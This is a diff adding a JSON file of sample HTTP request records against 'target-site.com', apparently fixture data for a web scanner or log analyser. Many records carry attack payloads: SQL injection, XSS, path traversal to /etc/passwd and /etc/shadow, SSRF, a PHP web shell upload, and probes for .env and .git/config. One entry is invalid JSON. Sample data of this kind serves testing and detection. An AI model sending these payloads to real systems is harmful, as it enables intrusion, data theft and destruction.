@@ -1,0 +1,680 @@
+[
+    {
+        "host": "target-site.com",
+        "path": "/profile?user=1001",
+        "method": "GET",
+        "params": [
+            {
+                "name": "user",
+                "value": "1001"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "Authorization": "Bearer valid_token_here"
+        },
+        "response": {
+            "status": 200,
+            "length": 1024
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/orders?id=500",
+        "method": "GET",
+        "params": [
+            {
+                "name": "id",
+                "value": "500"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 403,
+            "length": 128
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/login",
+        "method": "POST",
+        "params": [
+            {
+                "name": "username",
+                "value": "admin"
+            },
+            {
+                "name": "password",
+                "value": "password123"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "response": {
+            "status": 302,
+            "length": 0,
+            "location": "/dashboard"
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/data",
+        "method": "POST",
+        "params": [
+            {
+                "name": "id",
+                "value": "1 OR 1=1"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "Content-Type": "application/json",
+            "Authorization": "Bearer invalid_token"
+        },
+        "response": {
+            "status": 401,
+            "length": 64
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/admin",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 403,
+            "length": 256
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/search?q=<script>alert(1)</script>",
+        "method": "GET",
+        "params": [
+            {
+                "name": "q",
+                "value": "<script>alert(1)</script>"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 200,
+            "length": 900
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/deleteUser",
+        "method": "POST",
+        "params": [
+            {
+                "name": "userId",
+                "value": "1050"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "X-Forwarded-For": "127.0.0.1",
+            "Authorization": "Bearer admin_token"
+        },
+        "response": {
+            "status": 200,
+            "length": 50
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/config.php.bak",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 200,
+            "length": 2048
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/profile",
+        "method": "POST",
+        "params": [
+            {
+                "name": "bio",
+                "value": "'; DROP TABLE users; --"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "response": {
+            "status": 500,
+            "length": 512
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/.git/config",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 200,
+            "length": 350
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/download?file=../../../../etc/passwd",
+        "method": "GET",
+        "params": [
+            {
+                "name": "file",
+                "value": "../../../../etc/passwd"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 200,
+            "length": 3500
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/ssrf",
+        "method": "POST",
+        "params": [
+            {
+                "name": "url",
+                "value": "http://127.0.0.1:80/admin"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 200,
+            "length": 120
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/admin",
+        "method": "PUT",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 405,
+            "length": 60
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/profile",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "Cookie": "session=malicious; admin=true"
+        },
+        "response": {
+            "status": 200,
+            "length": 1024
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/.env",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
+        },
+        "response": {
+            "status": 200,
+            "length": 800
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/debug",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
+            "X-Debug": "true"
+        },
+        "response": {
+            "status": 200,
+            "length": 1500
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/users",
+        "method": "GET",
+        "params": [
+            {
+                "name": "page",
+                "value": "1"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 200,
+            "length": 500
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/users",
+        "method": "POST",
+        "params": [
+            {
+                "name": "username",
+                "value": "testuser"
+            },
+            {
+                "name": "email",
+                "value": "test@example.com"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 201,
+            "length": 100
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/users/1",
+        "method": "DELETE",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Authorization": "Bearer admin_token"
+        },
+        "response": {
+            "status": 204,
+            "length": 0
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/users/1",
+        "method": "PATCH",
+        "params": [
+            {
+                "name": "role",
+                "value": "admin"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 200,
+            "length": 120
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/export",
+        "method": "GET",
+        "params": [
+            {
+                "name": "format",
+                "value": "csv"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 200,
+            "length": 2048
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/export",
+        "method": "GET",
+        "params": [
+            {
+                "name": "format",
+                "value": "xml"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 200,
+            "length": 4096
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/upload",
+        "method": "POST",
+        "params": [
+            {
+                "name": "file",
+                "value": "../../../../etc/shadow"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "multipart/form-data"
+        },
+        "response": {
+            "status": 400,
+            "length": 80
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/settings",
+        "method": "PUT",
+        "params": [
+            {
+                "name": "timezone",
+                "value": "Europe/Madrid"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Authorization": "Bearer user_token"
+        },
+        "response": {
+            "status": 200,
+            "length": 60
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/settings",
+        "method": "PUT",
+        "params": [
+            {
+                "name": "timezone",
+                "value": "Europe/Madrid"
+            },
+            {
+                "name": "admin",
+                "value": "true"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Authorization": "Bearer user_token"
+        },
+        "response": {
+            "status": 403,
+            "length": 60
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/notify",
+        "method": "POST",
+        "params": [
+            {
+                "name": "message",
+                "value": "<img src=x onerror=alert(1)>"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 200,
+            "length": 100
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/admin/backup.zip",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 200,
+            "length": 100000
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/login",
+        "method": "POST",
+        "params": [
+            {
+                "name": "username",
+                "value": "admin' OR 1=1--"
+            },
+            {
+                "name": "password",
+                "value": "anything"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 200,
+            "length": 300
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/upload",
+        "method": "POST",
+        "params": [
+            {
+                "name": "file",
+                "value": "<?php system($_GET['cmd']); ?>"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "multipart/form-data"
+        },
+        "response": {
+            "status": 201,
+            "length": 100
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/profile",
+        "method": "PUT",
+        "params": [
+            {
+                "name": "email",
+                "value": "victim@example.com"
+            },
+            {
+                "name": "bio",
+                "value": "<svg/onload=alert(1337)>"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 200,
+            "length": 150
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/data",
+        "method": "GET",
+        "params": [
+            {
+                "name": "filter",
+                "value": "1; DROP DATABASE test;"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 500,
+            "length": 80
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/.DS_Store",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 200,
+            "length": 2048
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/secret",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "X-Original-URL": "/admin"
+        },
+        "response": {
+            "status": 200,
+            "length": 400
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/cors",
+        "method": "OPTIONS",
+        "params": [],
+        "headers": {
+            "Origin": "http://evil.com",
+            "Access-Control-Request-Method": "GET"
+        },
+        "response": {
+            "status": 200,
+            "length": 0,
+            "Access-Control-Allow-Origin": "*"
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/ssrf",
+        "method": "POST",
+        "params": [
+            {
+                "name": "url",
+                "value": "file:///etc/passwd"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/json"
+        },
+        "response": {
+            "status": 200,
+            "length": 3000
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/debug",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "X-Debug": "1"
+        },
+        "response": {
+            "status": 200,
+            "length": 2000
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/hidden",
+        "method": "GET",
+        "params": [],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 404,
+            "length": 10
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/hidden",
+        "method": "POST",
+        "params": [
+            {
+                "name": "cmd",
+                "value": "whoami"
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 403,
+            "length": 10
+        }
+    },
+    {
+        "host": "target-site.com",
+        "path": "/api/v1/fuzz",
+        "method": "GET",
+        "params": [
+            {
+                "name": "input",
+                "value": "A".repeat(10000)
+            }
+        ],
+        "headers": {
+            "User-Agent": "Mozilla/5.0"
+        },
+        "response": {
+            "status": 500,
+            "length": 0
+        }
+    }
+]
